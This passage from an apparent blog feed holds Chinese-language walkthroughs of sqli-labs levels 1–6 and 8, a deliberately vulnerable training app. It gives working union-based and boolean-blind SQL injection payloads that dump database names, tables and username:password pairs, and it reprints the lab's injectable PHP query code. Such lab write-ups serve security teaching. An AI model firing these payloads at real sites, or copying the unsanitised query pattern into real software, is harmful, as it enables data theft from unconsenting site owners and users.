class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line">      <span class="comment">//print_r(mysql_error());</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs：Less 5 6 8</title>
      <link href="/posts/Less%205%206%208(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/"/>
      <url>/posts/Less%205%206%208(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sqli-labs：Less-5-6-8"><a href="#sqli-labs：Less-5-6-8" class="headerlink" title="sqli-labs：Less 5 6 8"></a>sqli-labs：Less 5 6 8</h1><p>Less 5、6、7 都是基于bool注入的关卡，基本思想是利用函数提取出查询结果字符串的各个字符，利用回显信息依次判断原字符是什么。</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less 5"></a>Less 5</h2><p>双注入 GET <strong>单引号字符型bool注入</strong></p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先注入正确的参数，网页返回 “You are in…”，但是没有其他信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071638225.png" alt="image-20240807163802339"></p><p>接下来注入个查不到的参数，网页没有任何反应。说明向这个网页传入参数是用于判断 id 值是否存在，如果存在则返回信息。由于网页仅返回存在或不存在，因此我们可以使用 <strong>bool 注入</strong>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071638719.png" alt="image-20240807163826920"></p><p>判断是否有 SQL 注入漏洞，注入个单引号进行闭合，网页返回报错信息。这说明网页存在 SQL注入漏洞，并且是用单引号字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071639849.png" alt="image-20240807163925060"></p><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>判断表有几列，使用 ORDER BY 子句进行一个排序，测试到第3列返回 “You are in…”，测试到第4列未返回 “You are in…”，说明表中一共有 3 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p>猜测数据库名的长度，网页只会有返回 “You are in…” 和无回显两种情况，我们使用 length() 函数结合回显信息判断数据库长度，用二分法测试，能更快得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))&gt;5 --+    #返回 “You are in...” </span><br><span class="line">?id=1&#x27; and length((select database()))&gt;10 --+   #无回显</span><br><span class="line">?id=1&#x27; and length((select database()))=8 --+    #返回 “You are in...” </span><br></pre></td></tr></table></figure><p>获取数据库名，此处不适合用union联合查询。我们使用<code>left()</code>函数，<code>left(string，num)</code> 函数返回字符串 string 最左边的 num 个字符。我们首先使用 left() 函数判断数据库名的第一位是否是字符 a。注入之后无回显，说明数据库名第一位不是 a。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and left((select database()),1)=&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure><p>这里可以用bp抓包，然后对指定字符进行爆破，得出第一个字符为s</p><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408090940667.png" alt="image-20240809093957419"></p><p>接下来判断数据库名的第二位字符，还是使用 left() 函数进行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and left((select database()),2)=&#x27;sa&#x27; --+</span><br></pre></td></tr></table></figure><p>继续用bp进行爆破得到第二位字符为e，依次类推得到数据库名”security”<br>使用同样的方法继续爆破可以得到表名、字段名以及剩余信息。</p><p>爆破表名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),2)=&#x27;em&#x27; --+  </span><br><span class="line">#返回security库的第1个表名字符串最左边2个字符进行判断</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),2)=&#x27;us&#x27; --+ </span><br><span class="line">#返回security库的第4个表名字符串最左边2个字符进行判断</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,2)=&#x27;em&#x27; --+</span><br><span class="line">#从security库的第1个表名的第1位字符开始截取2位字符进行判断</span><br></pre></td></tr></table></figure><p>爆破字段名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1),8)=&#x27;username&#x27; --+ </span><br><span class="line">#返回security库的users表的第二个字段名最左边8个字符进行判断</span><br><span class="line">#若判断错误，则无回显</span><br></pre></td></tr></table></figure><p>爆破字段信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and left((select username from security.users limit 0,1),1)=&#x27;D&#x27; --+ </span><br><span class="line">#判断security库的users表的username字段下面的第1个值的第1个字母是否为D</span><br><span class="line">#若判断错误，则无回显</span><br></pre></td></tr></table></figure><h3 id="关卡SQL查询语句"><a href="#关卡SQL查询语句" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      echo &#x27;You are in...........&#x27;;</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less 6"></a>Less 6</h2><p>双注入 GET 双引号字符型注入</p><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1        #正常回显“You are in...”</span><br><span class="line">?id=1&#x27;       #正常回显“You are in...”</span><br><span class="line">?id=1&quot;       #报错</span><br><span class="line">?id=1&quot; --+   #正常回显“You are in...”</span><br><span class="line">?id=-1       #无回显</span><br></pre></td></tr></table></figure><p>此处存在SQL注入漏洞，并且是用双引号字符型注入<br>注入个查不到的参数，网页没有任何反应，说明向这个网页传入参数可用于判断 id 值是否存在，如果存在则返回信息。由于网页仅返回存在或不存在，因此我们可以使用 <strong>bool 注入</strong>。</p><h3 id="获取数据库信息-1"><a href="#获取数据库信息-1" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>除了闭合方式改为双引号外，注入方法可与Less 5一模一样。<br>这里我们尝试另一种注入方法。</p><p>判断数据库长度，用二分法测试，可尽快得出数据库长度为 8。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot; or length((select database()))=8 --+</span><br></pre></td></tr></table></figure><p><code>substr()</code> 函数用于截取字符串，<code>substr(string,start,length)</code> 函数的 string 为被截取的字符串，start 为起始位置，length 为截取长度。<code>ASCII()</code> 函数返回字符的 ASCII 码值，大致思路是使用 substr() 函数截取数据库名的每个字符，然后判断这个字符的 ASCII 码值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot; or ascii(substr((select database()),1,1))&gt;109--+</span><br><span class="line">?id=-1&quot; or ascii(substr((select database()),1,1))=115--+</span><br></pre></td></tr></table></figure><p>使用相同方法依次得出剩下的字符 ASCII 码值，连接在一起就是数据库名。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot; or ascii(substr((select database()),2,1))=102--+</span><br></pre></td></tr></table></figure><h3 id="关卡SQL查询语句-1"><a href="#关卡SQL查询语句-1" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      echo &#x27;You are in...........&#x27;;</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h2><p>布尔型单引号 GET 盲注</p><h3 id="判断注入类型-2"><a href="#判断注入类型-2" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先注入正确的参数，网页返回 “You are in…”，但是没有其他信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>接下来注入个查不到的参数，网页没有任何反应。说明向这个网页传入参数是用于判断 id 值是否存在，如果存在则返回信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1</span><br></pre></td></tr></table></figure><p>此时还是注入单引号，但是把后面的内容注释掉，网页返回 “You are in…”。这说明网页存在 Sql 注入漏洞，并且是用单引号字符型注入。同时因为 SQL 语句发生错误时也不报错，因此此处是 <strong>bool 盲注</strong>漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; --+</span><br></pre></td></tr></table></figure><h3 id="获取数据库信息-2"><a href="#获取数据库信息-2" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>和 Less 5 不同在于 Less 8 查询发生错误时不会报错，不过基本的操作与 Less 5 类似。首先判断表有几列，使用order by子句进行一个排序，测试到第 4 列未返回 “You are in…”，说明表至少有 3 行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p>猜测数据库名的长度，网页只会有返回 “You are in…” 和无回显 2 种情况，我们使用 length() 函数结合回显信息判断数据库长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select database()))=8--+</span><br></pre></td></tr></table></figure><p>使用 left() 函数判断数据库名的第一位是否是字符 a。注入之后无回显，说明数据库名第一位不是 a。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and left((select database()), 1)=&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure><p>这里可以打开 burp 抓包，爆破得出数据库名的第一个字符为 “s”。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and left((select database()), 1)=&#x27;s&#x27; --+</span><br></pre></td></tr></table></figure><p>使用相同方法爆出数据库名，接着继续爆破表名、字段名及其剩余信息。</p><h3 id="关卡SQL查询语句-2"><a href="#关卡SQL查询语句-2" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      echo &#x27;You are in...........&#x27;;</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">      echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">      //echo &#x27;You are in...........&#x27;;</span><br><span class="line">      //print_r(mysql_error());</span><br><span class="line">      //echo &quot;You have an error in your SQL syntax&quot;;</span><br><span class="line">      echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs：Less 1~4</title>
      <link href="/posts/Less%201~4/"/>
      <url>/posts/Less%201~4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sqli-labs：Less-1-4"><a href="#sqli-labs：Less-1-4" class="headerlink" title="sqli-labs：Less 1 ~ 4"></a>sqli-labs：Less 1 ~ 4</h1><p>Less 1~4 都是使用 GET 方法传参，根据 MySQL 的报错信息判断注入类型，再进行注入。</p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less 1"></a>Less 1</h2><p>基于错误的 GET <strong>单引号字符型注入</strong></p><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先先注入正常的参数，网页回显正常的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>尝试注入个单引号闭合，网页回显MySQL报错，说明存在注入漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p>接下来加个注释，我们观察到把后端的 SQL 语句后面的内容注释后，网页回显了正确的信息。也就是说我们注入的单引号起到了一个闭合的作用，这是一个<strong>字符型注入</strong>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>判断表有几列，使用order by子句进行一个排序，看一下对几列有效，测试到第 4 列无回显，说明表中一共有 3 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure><p>判断哪些列是我们能用的，首先令 id 参数为负数(为了查询不到结果)，然后使用union进行组合查询。网页回显了数字 2 和 3，说明第 2 列和第 3 列是我们可用的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=99&#x27; UNION SELECT 1,2,3--+</span><br></pre></td></tr></table></figure><p>查询库名，得到库名<code>security</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p>查询表名，得到表名：<code>emails,referers,uagents,users</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line">#&#x27;security&#x27; = 0x7365637572697479(如果过滤了单引号，则用16进制表示)</span><br></pre></td></tr></table></figure><p>爆破users表的字段名，得到字段名：<code>id,username,password</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br><span class="line">#&#x27;users&#x27; = 0x7573657273</span><br><span class="line">#如果不加字段table_schema=&#x27;security&#x27;，那么会将其他数据库里users的字段也爆出来</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071519899.png" alt="image-20240807151944697"></p><h3 id="获取目标信息"><a href="#获取目标信息" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><p>users表中存在用户名和密码这种敏感信息，接下来爆破这些信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users--+</span><br><span class="line">#&#x27;:&#x27; = 0x3a</span><br><span class="line">#concat_ws(分隔符,列名1，列名2)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071535174.png" alt="image-20240807153546326"></p><h3 id="关卡SQL查询语句"><a href="#关卡SQL查询语句" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less 2"></a>Less 2</h2><p>基于错误的GET整型注入</p><h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先先注入正常的参数，网页回显正常的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>尝试注入个单引号闭合，网页回显 MySQL报错，说明存在注入漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p>接下来加个注释，我们观察到把后端的 SQL 语句后面的内容注释后，网页仍然不能回显正确的信息。也就是说我们注入的单引号没有起到闭合的作用，这是一个<strong>数字型注入</strong>。数字型注入和字符型的区别在于我们不需要用单引号去闭合，其他操作步骤和 Less 1 相同。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure><h3 id="获取数据库信息-1"><a href="#获取数据库信息-1" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>判断表有几列，使用order by子句进行一个排序，测试到第 4 列无回显，说明表中一共有 3 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 3</span><br></pre></td></tr></table></figure><p>令 id 参数的查询不到结果，然后使用union select进行组合查询，网页回显了数字 2 和 3，说明第 2 列和第 3 列是我们可用的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p>爆数据库名，我们选择第 2 个位置作为显示位。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,database(),3</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071549192.png" alt="image-20240807154906321"></p><p>爆表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071552553.png" alt="image-20240807155230434"></p><p>爆users表的字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071559837.png" alt="image-20240807155925656"></p><h3 id="获取目标信息-1"><a href="#获取目标信息-1" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><p>爆出users表中的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(concat_ws(&#x27;:&#x27;,username,password)) from security.users</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071601596.png" alt="image-20240807160149244"></p><h3 id="关卡SQL查询语句-1"><a href="#关卡SQL查询语句-1" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less 3"></a>Less 3</h2><p>基于错误的 GET <strong>单引号变形字符型注入</strong></p><h3 id="判断注入类型-2"><a href="#判断注入类型-2" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>首先先注入正常的参数，网页回显正常的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure><p>尝试注入个单引号闭合，网页回显 MySQL报错，说明存在注入漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071609400.png" alt="image-20240807160926506"></p><p>根据报错信息我们需要一个括号来闭合，注释掉后面的 SQL 语句后其他操作步骤和 Less 1 相同。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)--+</span><br></pre></td></tr></table></figure><p><img src="https://cdn.moran233.xyz/https://raw.githubusercontent.com/xianglibie/image/main/202408071611962.png" alt="image-20240807161157126"></p><h3 id="获取数据库信息-2"><a href="#获取数据库信息-2" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>判断表有几列，使用order by子句进行一个排序，测试到第 4 列无回显，说明表中一共有 3 列。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure><p>爆数据库名，我们选择第 3 个位置作为显示位。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p>…除了多一个<code>)</code> 外，步骤与Less 1完全相同</p><h3 id="获取目标信息-2"><a href="#获取目标信息-2" class="headerlink" title="获取目标信息"></a>获取目标信息</h3><p>同Less 1</p><h3 id="关卡SQL查询语句-2"><a href="#关卡SQL查询语句-2" class="headerlink" title="关卡SQL查询语句"></a>关卡SQL查询语句</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysql_error());</span><br><span class="line">      <span class="keyword">echo</span> 